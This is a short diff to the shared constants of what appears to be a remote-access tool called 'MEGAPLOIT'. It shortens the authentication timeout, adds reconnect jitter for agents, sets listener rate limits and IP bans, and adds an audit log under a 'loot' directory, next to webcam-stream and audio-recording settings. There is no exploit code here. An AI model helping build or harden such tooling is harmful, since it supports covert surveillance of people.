@@ -5,9 +5,15 @@ Shared constants used by both the server and agent.
 """
 
 # TCP transport
-BUFFER_SIZE: int = 4096
-AUTH_TIMEOUT: int = 30      # seconds — timeout while authenticating
-RECONNECT_DELAY: int = 10   # seconds — agent waits before re-connecting
+BUFFER_SIZE: int   = 4096
+AUTH_TIMEOUT: int  = 10    # seconds — tight window prevents connection-holding attacks
+RECONNECT_DELAY: int = 10  # seconds — base delay before agent retries
+RECONNECT_JITTER: int = 5  # seconds — random 0..JITTER added so multiple agents don't
+                            #           reconnect in sync after a server restart
+
+# Listener hardening
+MAX_AUTH_ATTEMPTS_PER_MIN: int = 5   # per source IP; excess connections are dropped
+IP_BAN_DURATION: int = 300           # seconds an IP stays banned after exceeding the limit
 
 # Stream framing
 END_SENTINEL: bytes = b"<<MEGAPLOIT_END>>"
@@ -18,6 +24,9 @@ WEBCAM_STREAM_PORT: int = 5001
 
 # Audio recording cap
 MAX_RECORD_SECONDS: int = 300
+
+# Audit log path (server-side, relative to CWD)
+AUDIT_LOG: str = "loot/audit.log"
 
 # File paths (agent)
 import os as _os
